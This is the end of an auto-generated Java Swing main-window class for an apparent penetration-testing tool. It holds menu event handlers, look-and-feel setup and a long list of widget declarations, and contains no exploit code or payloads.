    }//GEN-LAST:event_jMenuItem59ActionPerformed

    private void jMenuItem60ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem60ActionPerformed
        // TODO add your handling code here:
        ShellWizard.main(null);
    }//GEN-LAST:event_jMenuItem60ActionPerformed

    private void jMenuItem61ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem61ActionPerformed
        // TODO add your handling code here:
        NetworkMapper.main(null);
    }//GEN-LAST:event_jMenuItem61ActionPerformed

    private void jMenuItem62ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem62ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem62ActionPerformed

    private void jMenuItem65ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem65ActionPerformed
        // TODO add your handling code here:
        Pattern.main(null);
    }//GEN-LAST:event_jMenuItem65ActionPerformed

    private void jMenuItem66ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem66ActionPerformed
        // TODO add your handling code here:
        CheckPattern.main(null);
    }//GEN-LAST:event_jMenuItem66ActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;

                }
            }
        } catch (ClassNotFoundException | InstantiationException | IllegalAccessException | javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(MainFrame.class
                    .getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new MainFrame().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton10;
    private javax.swing.JButton jButton11;
    private javax.swing.JButton jButton12;
    private javax.swing.JButton jButton13;
    private javax.swing.JButton jButton14;
    private javax.swing.JButton jButton15;
    private javax.swing.JButton jButton16;
    private javax.swing.JButton jButton17;
    private javax.swing.JButton jButton18;
    private javax.swing.JButton jButton19;
    private javax.swing.JButton jButton2;
    private javax.swing.JButton jButton20;
    private javax.swing.JButton jButton21;
    private javax.swing.JButton jButton22;
    private javax.swing.JButton jButton23;
    private javax.swing.JButton jButton24;
    private javax.swing.JButton jButton25;
    private javax.swing.JButton jButton26;
    private javax.swing.JButton jButton27;
    private javax.swing.JButton jButton3;
    private javax.swing.JButton jButton4;
    private javax.swing.JButton jButton5;
    private javax.swing.JButton jButton6;
    private javax.swing.JButton jButton7;
    private javax.swing.JButton jButton8;
    private javax.swing.JButton jButton9;
    private javax.swing.JButton jButtonExecution;
    private javax.swing.JButton jButtonSearch;
    private javax.swing.JButton jButtonShell;
    private javax.swing.JButton jButtonShell1;
    private javax.swing.JCheckBox jCheckBox2;
    private javax.swing.JCheckBox jCheckBoxSocketRandom;
    private javax.swing.JComboBox jComboBox1;
    private javax.swing.JComboBox jComboBoxCustom1;
    private javax.swing.JComboBox jComboBoxCustom2;
    private javax.swing.JComboBox jComboBoxShellcode;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel10;
    private javax.swing.JLabel jLabel11;
    private javax.swing.JLabel jLabel12;
    private javax.swing.JLabel jLabel13;
    private javax.swing.JLabel jLabel14;
    private javax.swing.JLabel jLabel15;
    private javax.swing.JLabel jLabel16;
    private javax.swing.JLabel jLabel17;
    private javax.swing.JLabel jLabel18;
    private javax.swing.JLabel jLabel19;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel20;
    private javax.swing.JLabel jLabel21;
    private javax.swing.JLabel jLabel22;
    private javax.swing.JLabel jLabel23;
    private javax.swing.JLabel jLabel24;
    private javax.swing.JLabel jLabel25;
    private javax.swing.JLabel jLabel26;
    private javax.swing.JLabel jLabel29;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel33;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private javax.swing.JLabel jLabel8;
    private javax.swing.JLabel jLabel9;
    private javax.swing.JLabel jLabelInterface;
    private javax.swing.JLabel jLabelPlatform;
    private javax.swing.JLabel jLabelTargetName;
    private javax.swing.JLabel jLabelWelcome;
    private javax.swing.JMenu jMenu1;
    private javax.swing.JMenu jMenu10;
    private javax.swing.JMenu jMenu11;
    private javax.swing.JMenu jMenu12;
    private javax.swing.JMenu jMenu13;
    private javax.swing.JMenu jMenu14;
    private javax.swing.JMenu jMenu15;
    private javax.swing.JMenu jMenu16;
    private javax.swing.JMenu jMenu17;
    private javax.swing.JMenu jMenu18;
    private javax.swing.JMenu jMenu2;
    private javax.swing.JMenu jMenu3;
    private javax.swing.JMenu jMenu4;
    private javax.swing.JMenu jMenu5;
    private javax.swing.JMenu jMenu6;
    private javax.swing.JMenu jMenu7;
    private javax.swing.JMenu jMenu8;
    private javax.swing.JMenu jMenu9;
    private javax.swing.JMenuBar jMenuBar1;
    private javax.swing.JMenuItem jMenuItem1;
    private javax.swing.JMenuItem jMenuItem10;
    private javax.swing.JMenuItem jMenuItem11;
    private javax.swing.JMenuItem jMenuItem12;
    private javax.swing.JMenuItem jMenuItem13;
    private javax.swing.JMenuItem jMenuItem14;
    private javax.swing.JMenuItem jMenuItem15;
    private javax.swing.JMenuItem jMenuItem16;
    private javax.swing.JMenuItem jMenuItem17;
    private javax.swing.JMenuItem jMenuItem18;
    private javax.swing.JMenuItem jMenuItem19;
    private javax.swing.JMenuItem jMenuItem2;
    private javax.swing.JMenuItem jMenuItem20;
    private javax.swing.JMenuItem jMenuItem21;
    private javax.swing.JMenuItem jMenuItem22;
    private javax.swing.JMenuItem jMenuItem23;
    private javax.swing.JMenuItem jMenuItem24;
    private javax.swing.JMenuItem jMenuItem25;
    private javax.swing.JMenuItem jMenuItem26;
    private javax.swing.JMenuItem jMenuItem27;
    private javax.swing.JMenuItem jMenuItem28;
    private javax.swing.JMenuItem jMenuItem29;
    private javax.swing.JMenuItem jMenuItem3;
    private javax.swing.JMenuItem jMenuItem30;
    private javax.swing.JMenuItem jMenuItem31;
    private javax.swing.JMenuItem jMenuItem32;
    private javax.swing.JMenuItem jMenuItem33;
    private javax.swing.JMenuItem jMenuItem34;
    private javax.swing.JMenuItem jMenuItem35;
    private javax.swing.JMenuItem jMenuItem36;
    private javax.swing.JMenuItem jMenuItem37;
    private javax.swing.JMenuItem jMenuItem38;
    private javax.swing.JMenuItem jMenuItem39;
    private javax.swing.JMenuItem jMenuItem4;
    private javax.swing.JMenuItem jMenuItem40;
    private javax.swing.JMenuItem jMenuItem41;
    private javax.swing.JMenuItem jMenuItem42;
    private javax.swing.JMenuItem jMenuItem43;
    private javax.swing.JMenuItem jMenuItem44;
    private javax.swing.JMenuItem jMenuItem48;
    private javax.swing.JMenuItem jMenuItem49;
    private javax.swing.JMenuItem jMenuItem5;
    private javax.swing.JMenuItem jMenuItem50;
    private javax.swing.JMenuItem jMenuItem51;
    private javax.swing.JMenuItem jMenuItem52;
    private javax.swing.JMenuItem jMenuItem53;
    private javax.swing.JMenuItem jMenuItem54;
    private javax.swing.JMenuItem jMenuItem55;
    private javax.swing.JMenuItem jMenuItem56;
    private javax.swing.JMenuItem jMenuItem57;
    private javax.swing.JMenuItem jMenuItem58;
    private javax.swing.JMenuItem jMenuItem59;
    private javax.swing.JMenuItem jMenuItem6;
    private javax.swing.JMenuItem jMenuItem60;
    private javax.swing.JMenuItem jMenuItem61;
    private javax.swing.JMenuItem jMenuItem62;
    private javax.swing.JMenuItem jMenuItem63;
    private javax.swing.JMenuItem jMenuItem64;
    private javax.swing.JMenuItem jMenuItem65;
    private javax.swing.JMenuItem jMenuItem66;
    private javax.swing.JMenuItem jMenuItem7;
    private javax.swing.JMenuItem jMenuItem8;
    private javax.swing.JMenuItem jMenuItem9;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel10;
    private javax.swing.JPanel jPanel11;
    private javax.swing.JPanel jPanel12;
    private javax.swing.JPanel jPanel13;
    private javax.swing.JPanel jPanel14;
    private javax.swing.JPanel jPanel15;
    private javax.swing.JPanel jPanel16;
    private javax.swing.JPanel jPanel17;
    private javax.swing.JPanel jPanel18;
    private javax.swing.JPanel jPanel19;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JPanel jPanel20;
    private javax.swing.JPanel jPanel21;
    private javax.swing.JPanel jPanel22;
    private javax.swing.JPanel jPanel23;
    private javax.swing.JPanel jPanel24;
    private javax.swing.JPanel jPanel25;
    private javax.swing.JPanel jPanel3;
    private javax.swing.JPanel jPanel4;
    private javax.swing.JPanel jPanel5;
    private javax.swing.JPanel jPanel6;
    private javax.swing.JPanel jPanel7;
    private javax.swing.JPanel jPanel8;
    private javax.swing.JPanel jPanel9;
    private javax.swing.JPanel jPanelDashboard;
    private javax.swing.JPanel jPanelEditor;
    private javax.swing.JPanel jPanelTargets;
    private javax.swing.JPopupMenu jPopupMenu1;
    private javax.swing.JProgressBar jProgressBarModuleStatus;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane10;
    private javax.swing.JScrollPane jScrollPane11;
    private javax.swing.JScrollPane jScrollPane12;
    private javax.swing.JScrollPane jScrollPane17;
    private javax.swing.JScrollPane jScrollPane18;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JScrollPane jScrollPane3;
    private javax.swing.JScrollPane jScrollPane4;
    private javax.swing.JScrollPane jScrollPane5;
    private javax.swing.JScrollPane jScrollPane6;
    private javax.swing.JScrollPane jScrollPane7;
    private javax.swing.JScrollPane jScrollPane8;
    private javax.swing.JScrollPane jScrollPane9;
    private javax.swing.JToolBar.Separator jSeparator1;
    private javax.swing.JToolBar.Separator jSeparator10;
    private javax.swing.JToolBar.Separator jSeparator11;
    private javax.swing.JToolBar.Separator jSeparator12;
    private javax.swing.JPopupMenu.Separator jSeparator13;
    private javax.swing.JPopupMenu.Separator jSeparator14;
    private javax.swing.JPopupMenu.Separator jSeparator15;
    private javax.swing.JPopupMenu.Separator jSeparator16;
    private javax.swing.JPopupMenu.Separator jSeparator17;
    private javax.swing.JPopupMenu.Separator jSeparator18;
    private javax.swing.JPopupMenu.Separator jSeparator19;
    private javax.swing.JToolBar.Separator jSeparator2;
    private javax.swing.JPopupMenu.Separator jSeparator20;
    private javax.swing.JPopupMenu.Separator jSeparator21;
    private javax.swing.JToolBar.Separator jSeparator22;
    private javax.swing.JToolBar.Separator jSeparator23;
    private javax.swing.JToolBar.Separator jSeparator24;
    private javax.swing.JToolBar.Separator jSeparator25;
    private javax.swing.JPopupMenu.Separator jSeparator26;
    private javax.swing.JPopupMenu.Separator jSeparator27;
    private javax.swing.JPopupMenu.Separator jSeparator28;
    private javax.swing.JPopupMenu.Separator jSeparator29;
    private javax.swing.JToolBar.Separator jSeparator3;
    private javax.swing.JToolBar.Separator jSeparator30;
    private javax.swing.JPopupMenu.Separator jSeparator31;
    private javax.swing.JPopupMenu.Separator jSeparator32;
    private javax.swing.JPopupMenu.Separator jSeparator33;
    private javax.swing.JPopupMenu.Separator jSeparator34;
    private javax.swing.JPopupMenu.Separator jSeparator35;
    private javax.swing.JPopupMenu.Separator jSeparator36;
    private javax.swing.JToolBar.Separator jSeparator37;
    private javax.swing.JSeparator jSeparator38;
    private javax.swing.JToolBar.Separator jSeparator39;
    private javax.swing.JToolBar.Separator jSeparator4;
    private javax.swing.JToolBar.Separator jSeparator40;
    private javax.swing.JToolBar.Separator jSeparator41;
    private javax.swing.JToolBar.Separator jSeparator42;
    private javax.swing.JToolBar.Separator jSeparator43;
    private javax.swing.JToolBar.Separator jSeparator44;
    private javax.swing.JToolBar.Separator jSeparator45;
    private javax.swing.JToolBar.Separator jSeparator46;
    private javax.swing.JToolBar.Separator jSeparator47;
    private javax.swing.JPopupMenu.Separator jSeparator48;
    private javax.swing.JPopupMenu.Separator jSeparator49;
    private javax.swing.JToolBar.Separator jSeparator5;
    private javax.swing.JPopupMenu.Separator jSeparator50;
    private javax.swing.JToolBar.Separator jSeparator6;
    private javax.swing.JToolBar.Separator jSeparator7;
    private javax.swing.JToolBar.Separator jSeparator8;
    private javax.swing.JSeparator jSeparator9;
    private javax.swing.JTabbedPane jTabbedPane;
    private javax.swing.JTabbedPane jTabbedPane1;
    private javax.swing.JTabbedPane jTabbedPane2;
    private javax.swing.JTextArea jTextAreaAppLog;
    private javax.swing.JTextArea jTextAreaDebugging;
    private javax.swing.JTextArea jTextAreaPentestFooter;
    private javax.swing.JTextArea jTextAreaPentestHeader;
    private javax.swing.JTextArea jTextAreaQuickInfo;
    private javax.swing.JTextArea jTextAreaShellcode;
    private javax.swing.JTextArea jTextAreaShellcodeList;
    private javax.swing.JTextArea jTextAreaSocketFuzz;
    private javax.swing.JTextField jTextFieldCustom1;
    private javax.swing.JTextField jTextFieldCustom2;
    private javax.swing.JTextField jTextFieldCustomDesc1;
    private javax.swing.JTextField jTextFieldCustomDesc2;
    private javax.swing.JTextField jTextFieldExtraOptions;
    private javax.swing.JTextField jTextFieldLocalHost;
    private javax.swing.JTextField jTextFieldPentestImage;
    private javax.swing.JTextField jTextFieldPentestName;
    private javax.swing.JTextField jTextFieldPentestSubTittle;
    private javax.swing.JTextField jTextFieldProjectN;
    private javax.swing.JTextField jTextFieldSearch;
    private javax.swing.JTextField jTextFieldShellinput;
    private javax.swing.JTextField jTextFieldSocketData;
    private javax.swing.JTextField jTextFieldSocketPort;
    private javax.swing.JTextField jTextFieldSocketURL;
    private javax.swing.JTextField jTextFieldTargetH;
    private javax.swing.JTextField jTextFieldTargetP;
    private javax.swing.JTextField jTextFieldTargetPath;
    private javax.swing.JTextField jTextFieldshellPort;
    private javax.swing.JToolBar jToolBar1;
    private javax.swing.JToolBar jToolBar2;
    private javax.swing.JToolBar jToolBar3;
    private javax.swing.JTree jTreeExploits;
    private javax.swing.JTree jTreeModuleStatus;
    private javax.swing.JTree jTreeNotepad;
    private javax.swing.JTree jTreeRAT;
    private javax.swing.JTree jTreeRemoteScanner;
    private javax.swing.JTree jTreeTools;
    // End of variables declaration//GEN-END:variables

}